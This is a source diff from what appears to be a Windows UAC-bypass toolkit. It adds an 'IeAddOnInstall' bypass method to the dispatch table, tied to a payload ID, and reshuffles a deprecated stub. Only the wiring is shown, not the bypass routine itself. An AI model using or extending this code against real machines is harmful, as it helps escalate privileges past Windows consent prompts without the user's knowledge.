@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.50
+*  VERSION:     3.51
 *
-*  DATE:        22 Sep 2020
+*  DATE:        16 Oct 2020
 *
 *  UAC bypass dispatch.
 *
@@ -40,6 +40,7 @@ UCM_API(MethodDebugObject);
 UCM_API(MethodShellChangePk);
 UCM_API(MethodNICPoison);
 UCM_API(MethodDeprecated);
+UCM_API(MethodIeAddOnInstall);
 
 #define UCM_WIN32_NOT_IMPLEMENTED_COUNT 3
 ULONG UCM_WIN32_NOT_IMPLEMENTED[UCM_WIN32_NOT_IMPLEMENTED_COUNT] = {
@@ -112,7 +113,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodShellChangePk, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodMsSettings, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodNICPoison, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodNICPoison, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodIeAddOnInstall, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -340,6 +342,12 @@ NTSTATUS MethodsManagerCall(
 **
 **
 ************************************************************/
+
+UCM_API(MethodDeprecated)
+{
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+}
 
 UCM_API(MethodTest)
 {
@@ -613,8 +621,14 @@ UCM_API(MethodNICPoison)
 #endif
 }
 
-UCM_API(MethodDeprecated)
+UCM_API(MethodIeAddOnInstall)
 {
+#ifdef _WIN64
+    return ucmIeAddOnInstallMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#else
     UNREFERENCED_PARAMETER(Parameter);
     return STATUS_NOT_SUPPORTED;
+#endif
 }
